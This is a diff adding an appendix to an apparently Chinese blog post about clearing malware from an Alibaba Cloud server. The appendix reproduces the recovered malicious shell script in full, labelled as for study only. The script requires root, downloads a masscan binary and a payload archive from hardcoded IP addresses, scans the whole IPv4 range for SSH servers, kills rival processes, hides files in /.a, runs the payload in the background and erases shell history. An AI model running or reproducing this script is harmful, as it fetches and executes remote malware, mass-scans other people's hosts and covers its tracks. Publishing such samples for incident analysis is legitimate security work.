@@ -144,4 +144,85 @@ $ ll /proc/25403
 
 >后记，观察几天，再没有收到阿里云的告警信息。
 
+***
 
+附sh脚本源码，请勿违法实验，仅供学习研究：
+```shell
+#!/bin/bash
+
+if [[ $(id -u) -ne 0 ]] ; then echo "Please run as root" ; exit 1 ; fi
+
+PR=1
+PR=$(cat /proc/cpuinfo | grep model | grep name | wc -l)
+
+ARCH=`uname -m`
+
+if [[ "$ARCH" =~ ^arm ]]; then
+    echo "Arm detected. Exiting"    
+    exit
+fi
+
+if [ $PR -gt 9 ]; then
+    echo "Too many CPUs. Exiting" 
+    exit
+else
+    echo "CPUs ok"
+
+#random sleep, for flood protection
+rm -rf masscan*
+rm -rf input.txt*
+
+RANGE=440
+s=$RANDOM
+let "s %= $RANGE"
+sleep $s
+echo "test"
+
+#is it good for masscan?
+
+wget -q http://45.55.210.248/masscan || curl -s O -f http://104.236.72.182/masscan
+sleep 25m
+chmod 777 masscan
+timeout 20s nohup ./masscan -p 22 --banner --rate 50000 --exclude 255.255.255.255 --exclude 10.0.0.0/8 --exclude 192.168.0.0/16 --exclude 127.0.0.0/8   --range 1.0.0.0-223.255.255.255 > input.txt 
+
+sleep 1m
+
+got=$(cat input.txt | grep OpenSSH | wc -l | awk -F: '{if($0>1)print$0}')
+
+rm -rf masscan*
+# if got > 1000; good for masscan; else exit
+
+if [ $got -lt 1000 ]; then
+    echo "Bad for masscan. Exiting" 
+    rm -rf input.txt*
+    exit
+else
+    echo "Good for masscan. Executing"
+    rm -rf input.txt*
+    #all good
+
+    pkill -9 screen
+    pkill -9 mass
+    pkill -9 scan
+
+    apt install expect -y
+    yum install expect -y
+
+    sleep 5s
+
+    rm -rf /.a
+    cd  / 
+    mkdir .a
+    cd .a
+    wget -q http://45.55.129.23/mas.tar.gz || curl -s O -f http://45.55.129.23/mas.tar.gz 
+    sleep 25m && tar xvf mas.tar.gz 
+    rm -rf mas.tar.gz
+    cd mass2ip
+    nohup ./mass.sh >>/dev/null 2>1& 
+    cd ~ 
+    rm -rf .bash_history 
+    history -c 
+    history -nc
+    fi
+fi
+```
